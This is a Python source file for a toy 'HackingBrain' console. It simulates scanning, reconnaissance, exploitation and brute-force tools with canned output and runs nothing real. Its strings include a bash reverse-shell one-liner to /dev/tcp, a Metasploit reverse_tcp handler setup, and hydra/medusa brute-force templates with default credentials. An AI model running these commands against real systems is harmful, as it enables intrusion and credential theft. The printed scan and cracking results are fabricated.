import random
import time
from dataclasses import dataclass
from typing import Dict, Optional, List
import json
import os
import sys

@dataclass
class HackingModule:
    name: str
    description: str
    commands: Dict[str, str]

class HackingBrain:
    def __init__(self):
        self.modules = self._init_modules()
        self.current_module = "scan"
        self.command_count = 0
        self.targets: List[str] = []
        self.history: List[str] = []
        self.session_file = "hacking_session.json"
        self.credentials: Dict[str, str] = {}
        
    def _init_modules(self):
        return {
            "scan": HackingModule("SCAN", "Network scanning & enumeration", {
                "nmap": "nmap -sV [target] - Port scanning with service detection",
                "nmap -sS": "nmap -sS [target] - SYN stealth scan",
                "nmap -A": "nmap -A [target] - Aggressive scan with OS detection",
                "nikto": "nikto -h [target] - Web vulnerability scanner",
                "masscan": "masscan [target] - High-speed port scanner"
            }),
            "recon": HackingModule("RECON", "Reconnaissance & OSINT", {
                "whois": "whois [target] - Domain registration lookup",
                "theharvester": "theHarvester -d [target] - Email/subdomain harvesting",
                "dnsrecon": "dnsrecon -d [target] - DNS enumeration"
            }),
            "exploit": HackingModule("EXPLOIT", "Exploitation framework", {
                "msfconsole": "msfconsole - Metasploit framework",
                "exploit": "exploit [cve] - CVE exploitation module",
                "payload": "payload [type] - Generate reverse shell payloads"
            }),
            "crypto": HackingModule("CRYPTO", "Cryptographic tools", {
                "hashcat": "hashcat - Hash cracking tool",
                "openssl": "openssl - Encryption/decryption toolkit"
            }),
            "bruteforce": HackingModule("BRUTEFORCE", "Brute force attacks", {
                "hydra": "hydra [target] -v -L users.txt -P pass.txt [service] - Password cracking",
                "medusa": "medusa -h [target] -u admin -P pass.txt -M ssh - SSH brute force",
                "ncrack": "ncrack -p ssh [target] - Network credential testing",
                "john": "john hash.txt - Password hash cracking",
                "wordlist": "wordlist [type] - Generate custom wordlist"
            })
        }
    
    def list_modules(self) -> str:
        modules_str = "Available modules:\n"
        for mod in self.modules.values():
            modules_str += f"  [{mod.name}] {mod.description}\n"
        return modules_str
    
    def switch_module(self, module_name: str) -> Optional[str]:
        if module_name.lower() in self.modules:
            self.current_module = module_name.lower()
            return f"Switched to {module_name.upper()} module"
        return f"[ERROR] Unknown module: {module_name}"
    
    def add_target(self, target: str) -> str:
        self.targets.append(target)
        return f"Target added: {target}"
    
    def show_targets(self) -> str:
        if not self.targets:
            return "No targets set. Use 'target <host>' to add targets."
        result = "Current targets:\n"
        for i, t in enumerate(self.targets, 1):
            result += f"  {i}. {t}\n"
        return result
    
    def _progress_bar(self, total: int = 100, delay: float = 0.02) -> str:
        result = ""
        for i in range(total // 10 + 1):
            bar = "[" + "=" * i + ">" + " " * (10 - i - 1) + "]"
            result += f"\rProgress: {bar} {min(i * 10, 100)}%"
            time.sleep(delay)
        return result + "\n"
    
    def _simulate_scan(self, cmd: str, target: str) -> str:
        outputs = {
            "nmap": f"Starting Nmap scan on {target}...\n[SCAN] PORT     STATE     SERVICE\n[SCAN] 22/tcp   open      ssh\n[SCAN] 80/tcp   open      http\n[SCAN] 443/tcp  open      https\nScan completed in 3.2s",
            "nikto": f"Nikto scanning {target}...\n[SCAN] + Target port: 80\n[SCAN] + Server: Apache/2.4.41\n[SCAN] + /admin/ - Directory indexing found\n[SCAN] + /backup/ - Potential sensitive directory",
            "masscan": f"Masscan scanning {target}...\n[SCAN] Discovered open ports:\n[SCAN] 22, 80, 443, 3306, 8080\nScan rate: 100000 pps",
        }
        return outputs.get(cmd.split()[0] if " " in cmd else cmd, f"Simulated execution on {target}")
    
    def _simulate_recon(self, cmd: str, target: str) -> str:
        outputs = {
            "whois": f"WHOIS lookup for {target}...\n[RECON] Registrar: Example Inc\n[RECON] Created: 2020-01-01\n[RECON] Expires: 2027-01-01\n[RECON] Nameservers: ns1.example.com, ns2.example.com",
            "theharvester": f"Harvesting emails/subdomains for {target}...\n[RECON] admin@{target}\n[RECON] info@{target}\n[RECON] Subdomain: mail.{target}\n[RECON] Subdomain: dev.{target}",
            "dnsrecon": f"DNS reconnaissance on {target}...\n[RECON] A record: {target} -> 192.168.1.100\n[RECON] MX record: mail.{target}\n[RECON] TXT record: v=spf1 include:{target} ~all",
        }
        return outputs.get(cmd.split()[0] if " " in cmd else cmd, f"Simulated recon on {target}")
    
    def _simulate_exploit(self, cmd: str) -> str:
        outputs = {
            "msfconsole": "Launching Metasploit...\n[EXPLOIT] msf6 > use exploit/multi/handler\n[EXPLOIT] msf6 > set PAYLOAD windows/meterpreter/reverse_tcp\n[EXPLOIT] msf6 > exploit -j",
            "payload": "[EXPLOIT] Generating reverse shell payload...\n[EXPLOIT] Payload: bash -i >& /dev/tcp/target/4444 0>&1\n[EXPLOIT] Alternative: python -c 'import socket...'",
        }
        return outputs.get(cmd.split()[0] if " " in cmd else cmd, "Simulated exploitation")
    
    def _simulate_crypto(self, cmd: str) -> str:
        return f"[{cmd.upper()}] Cryptographic operation simulated"
    
    def _simulate_bruteforce(self, cmd: str, target: str) -> str:
        cmd_base = cmd.split()[0] if " " in cmd else cmd
        outputs = {
            "hydra": f"[BRUTEFORCE] Starting Hydra attack on {target}...\n[BRUTEFORCE] Login attempts: admin:admin, root:root, admin:password123\n[BRUTEFORCE] SUCCESS: {target} - admin:password123",
            "medusa": f"[BRUTEFORCE] Medusa brute force against {target}...\n[BRUTEFORCE] Target: ssh://{target}:22\n[BRUTEFORCE] Rate: 1000 attempts/minute\n[BRUTEFORCE] Valid credentials found: root:toor",
            "ncrack": f"[BRUTEFORCE] Ncrack scanning {target}...\n[BRUTEFORCE] Credentials discovered for ssh service",
            "john": "[BRUTEFORCE] John the Ripper cracking hashes...\n[BRUTEFORCE] crackit -> 5e884898da2804715679887ce28f8322\n[BRUTEFORCE] password123 -> 482c811da5d5b4bc60c51993e9dcf447",
            "wordlist": "[BRUTEFORCE] Wordlist generation options:\n  cewl - Generate from target site\n  crunch - Custom pattern wordlist\n  rockyou.txt - Default wordlist",
        }
        result = outputs.get(cmd_base, f"Simulated brute force on {target}")
        if cmd_base in ["hydra", "medusa", "ncrack"]:
            self.credentials[target] = f"user_{random.randint(1000,9999)}:pass_{random.randint(1000,9999)}"
        return result
    
    def show_credentials(self) -> str:
        if not self.credentials:
            return "No credentials harvested yet."
        result = "Harvested credentials:\n"
        for target, cred in self.credentials.items():
            result += f"  {target}: {cred}\n"
        return result
    
    def interactive(self):
        print("HackingBrain v2.0 - Type 'help' for commands, 'exit' to quit")
        while True:
            try:
                cmd = input(f"[{self.current_module.upper()}]> ").strip()
                if cmd.lower() in ["exit", "quit", "q"]:
                    print("Exiting HackingBrain...")
                    break
                result = self.execute(cmd)
                if result:
                    print(result)
            except (EOFError, KeyboardInterrupt):
                print("\nExiting...")
                break
    
    def execute(self, cmd: str) -> Optional[str]:
        cmd = cmd.strip()
        if not cmd:
            return None
        self.history.append(cmd)
        
        if cmd.lower() == "help":
            mod = self.modules[self.current_module]
            return f"[{mod.name}] {mod.description}\nCommands: " + ", ".join(mod.commands.keys())
        
        if cmd.lower() == "modules":
            return self.list_modules()
        
        if cmd.lower() == "creds":
            return self.show_credentials()
        
        if cmd.lower().startswith("use "):
            module = cmd[4:].strip().lower()
            return self.switch_module(module)
        
        if cmd.lower().startswith("target "):
            target = cmd[7:].strip()
            return self.add_target(target)
        
        if cmd.lower() == "targets":
            return self.show_targets()
        
        if cmd.lower() == "history":
            return "Command history:\n" + "\n".join(f"  {i+1}. {h}" for i, h in enumerate(self.history))
        
        if cmd.lower() == "clear":
            self.targets = []
            self.history = []
            self.credentials = {}
            return "Session cleared"
        
        if cmd.lower() == "save":
            data = {"targets": self.targets, "history": self.history, "credentials": self.credentials}
            with open(self.session_file, "w") as f:
                json.dump(data, f, indent=2)
            return f"Session saved to {self.session_file}"
        
        if cmd.lower() == "load":
            if os.path.exists(self.session_file):
                with open(self.session_file, "r") as f:
                    data = json.load(f)
                self.targets = data.get("targets", [])
                self.history = data.get("history", [])
                self.credentials = data.get("credentials", {})
                return f"Session loaded from {self.session_file}"
            return "[ERROR] No saved session found"
        
        cmd_words = cmd.split()
        if not cmd_words:
            return None
            
        for mod in self.modules.values():
            for pattern, description in mod.commands.items():
                pattern_words = pattern.split()
                if pattern_words and cmd_words[0] == pattern_words[0]:
                    self.command_count += 1
                    target = self.targets[0] if self.targets else "localhost"
                    if mod.name == "SCAN":
                        return self._simulate_scan(cmd, target)
                    elif mod.name == "RECON":
                        return self._simulate_recon(cmd, target)
                    elif mod.name == "EXPLOIT":
                        return self._simulate_exploit(cmd)
                    elif mod.name == "CRYPTO":
                        return self._simulate_crypto(cmd)
                    elif mod.name == "BRUTEFORCE":
                        return self._simulate_bruteforce(cmd, target)
                    return f"[{mod.name.upper()}] {cmd}\nSimulated execution completed."
        return f"[ERROR] Unknown command: {cmd}"

def main():
    brain = HackingBrain()
    print("HackingBrain v2.0 - Starting in interactive mode\n")
    print(brain.execute("modules"))
    print("\nUse 'use bruteforce' to switch modules, 'hydra', 'medusa', etc.")
    brain.interactive()

if __name__ == "__main__":
    main()